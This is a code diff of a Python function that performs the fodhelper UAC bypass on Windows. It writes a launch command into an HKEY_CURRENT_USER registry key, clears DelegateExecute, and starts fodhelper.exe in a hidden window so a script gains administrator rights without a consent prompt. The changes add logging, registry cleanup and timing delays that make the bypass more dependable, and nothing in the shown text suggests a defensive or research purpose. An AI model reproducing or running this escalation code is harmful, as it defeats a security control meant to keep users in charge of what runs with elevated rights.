@@ -42,16 +42,21 @@ def _try_bypass_uac(entry_script: str) -> bool:
     try:
         import winreg
     except ImportError:
+        print("[UAC] winreg 导入失败，跳过 bypass")
         return False
 
     try:
+        # 先彻底清理旧残留
+        _cleanup_registry()
+        import time
+        time.sleep(0.05)
+
         reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, UAC_REG_PATH)
 
         # 清空 DelegateExecute 让 fodhelper 走我们指定的命令
         winreg.SetValueEx(reg_key, "DelegateExecute", 0, winreg.REG_SZ, "")
 
         # 设置默认值为启动命令
-        # 优先用 pythonw.exe（无控制台窗口），避免 fodhelper 提权时闪黑框
         python_exe = sys.executable
         pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
         if os.path.exists(pythonw_exe):
@@ -61,17 +66,22 @@ def _try_bypass_uac(entry_script: str) -> bool:
 
         winreg.CloseKey(reg_key)
 
-        # 静默启动 fodhelper（隐藏 cmd 窗口）
+        print(f"[UAC] fodhelper bypass: cmd={cmd}")
+
+        # 静默启动 fodhelper
         subprocess.Popen(
             r"C:\Windows\System32\fodhelper.exe",
             creationflags=subprocess.CREATE_NO_WINDOW,
         )
 
-        # 尽快清理注册表
+        # 等 fodhelper 读取注册表后再清理
+        time.sleep(0.3)
         _cleanup_registry()
 
         return True
-    except Exception:
+    except Exception as e:
+        print(f"[UAC] fodhelper bypass 异常: {e}")
+        _cleanup_registry()
         return False
 
 
